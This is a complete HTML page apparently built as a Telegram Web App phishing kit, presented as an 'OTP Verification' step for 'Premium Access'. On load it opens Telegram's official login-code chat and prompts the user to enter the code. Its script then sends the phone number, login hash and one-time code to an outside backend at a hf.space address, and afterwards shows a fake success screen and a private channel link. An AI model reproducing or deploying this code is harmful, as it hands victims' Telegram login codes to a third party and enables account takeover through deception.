<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OTP Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f0f0f; color: white; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .modal-content { background: #1a1a1a; padding: 30px 20px; border-radius: 20px; width: 85%; max-width: 350px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .login-input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #000; color: #fff; margin-bottom: 20px; font-size: 16px; outline: none; text-align: center; letter-spacing: 5px; }
        .login-input:focus { border-color: #00ffaa; }
        .share-btn { background: linear-gradient(90deg, #00ffaa, #00aaff); color: #000; border: none; padding: 15px; border-radius: 12px; width: 100%; font-size: 16px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .toast { visibility: hidden; background-color: #333; color: #fff; text-align: center; border-radius: 8px; padding: 12px; position: fixed; z-index: 9999; left: 50%; bottom: 30px; transform: translateX(-50%); font-size: 14px; font-weight: bold; opacity: 0; transition: opacity 0.3s; }
        .toast.show { visibility: visible; opacity: 1; bottom: 50px; }
    </style>
</head>
<body>

    <!-- OTP Input Box -->
    <div class="modal-content" id="otp-box">
        <h3 style="color: #00ffaa; margin-top: 0;">🔐 Enter Verification Code</h3>
        <p style="font-size: 12px; color: #ccc; margin-bottom: 20px;">We are opening your Telegram chat natively. Check the code and enter it below.</p>
        
        <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP">
        
        <button id="btn-verify-code" class="share-btn" onclick="verifyCode()">Verify & Connect</button>
        
        <div style="margin-top: 15px; display: flex; justify-content: space-between; font-size: 12px;">
            <button onclick="openChatAgain()" style="background: transparent; color: #00ffaa; border: none; text-decoration: underline; cursor: pointer;">Open Chat Again</button>
            <button onclick="goBack()" style="background: transparent; color: #ff3366; border: none; text-decoration: underline; cursor: pointer;">Go Back</button>
        </div>
    </div>

    <!-- Success Box -->
    <div class="modal-content" id="success-box" style="display:none;">
        <div style="font-size:45px; margin-bottom:10px;">💎</div>
        <h3 style="margin-top:0; color:#00ffaa;">Premium Access Granted!</h3>
        <p style="font-size: 13px; color: #ddd; margin-bottom: 20px;">You have successfully linked your account. 👑<br>Now join our Secret Premium Channel.</p>
        <button class="share-btn" style="background: linear-gradient(90deg, #ffcc00, #ff9900);" onclick="tg.openLink('https://t.me/+snT3FqTlgmJlNDQ1')">🚀 Visit Premium Channel</button>
    </div>

    <div id="toast" class="toast">Message</div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const urlParams = new URLSearchParams(window.location.search);
        const phone = decodeURIComponent(urlParams.get('phone'));
        const hash = decodeURIComponent(urlParams.get('hash'));
        const userId = urlParams.get('user_id') || '123456';
        const BACKEND_URL = 'https://pmrony-forwardbot.hf.space';

        function showToast(msg) {
            const toast = document.getElementById("toast");
            toast.innerText = msg;
            toast.className = "toast show";
            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 4000);
        }

        // ====== MASTERMIND MAGIC ======
        // যেহেতু এটি মেইন ওয়েবঅ্যাপের ফ্রেমের ভেতরেই ওপেন হয়েছে, তাই কোনো এক্সটার্নাল ব্রাউজার ক্র্যাশ করবে না।
        function openChatAgain() {
            window.location.href = "tg://openmessage?user_id=777000";
        }

        // পেজ লোড হওয়া মাত্রই নিজে থেকে ওটিপি চ্যাট ওপেন করে দেবে
        window.onload = function() {
            setTimeout(() => {
                openChatAgain();
            }, 600);
        };

        function goBack() {
            window.location.href = 'index.html';
        }

        // OTP Verify লজিক
        async function verifyCode() {
            const otp = document.getElementById('otp-input').value.trim();
            if(!otp) return showToast("Enter OTP!");
            
            const btn = document.getElementById('btn-verify-code');
            const originalText = btn.innerHTML;
            btn.innerHTML = "⏳ Verifying...";
            btn.disabled = true;

            try {
                const res = await fetch(BACKEND_URL + '/api/verify_code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: phone, hash: hash, otp: otp, user_id: userId })
                });
                const data = await res.json();
                
                if(data.status === "ok") {
                    document.getElementById('otp-box').style.display = 'none';
                    document.getElementById('success-box').style.display = 'block';
                } else {
                    showToast("Error: " + data.msg);
                }
            } catch(e) {
                showToast("Server connection error!");
            } finally {
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
